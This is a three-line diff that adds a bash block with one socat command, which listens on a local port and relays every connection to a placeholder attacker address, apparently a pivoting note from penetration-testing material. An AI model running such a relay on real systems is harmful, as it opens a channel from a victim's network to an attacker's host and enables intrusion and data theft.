@@ -1,0 +1,3 @@
+```bash
+./socat TCP-LISTEN:<PORT_LISTEN>,fork TCP:<ATTACKER_IP>:<ATTACKER_PORT>
+```
